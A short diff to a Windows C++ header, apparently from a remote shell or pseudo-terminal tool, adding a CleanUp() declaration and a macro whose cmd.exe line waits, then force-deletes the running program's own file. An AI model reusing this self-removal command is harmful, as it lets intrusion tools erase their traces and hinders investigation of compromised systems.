@@ -9,6 +9,8 @@
 #define BUFFER_SIZE_PIPE 1048576
 #define BUFFER_SIZE_SOCKET 8192
 
+#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
+
 DWORD  GetParentProcessId(DWORD dwProcessId = 0);
 
 HANDLE GetProcessHandle(DWORD dwProcessId);
@@ -77,5 +79,7 @@ typedef NTSTATUS(NTAPI* NtResumeProcessPtr)(
 );
 
 HRESULT SpawnPty(CString csCommandLine, DWORD dwRows, DWORD dwCols, char* pPopenControlCode, char* pPtyControlCode);
+
+void CleanUp();
 
 #endif
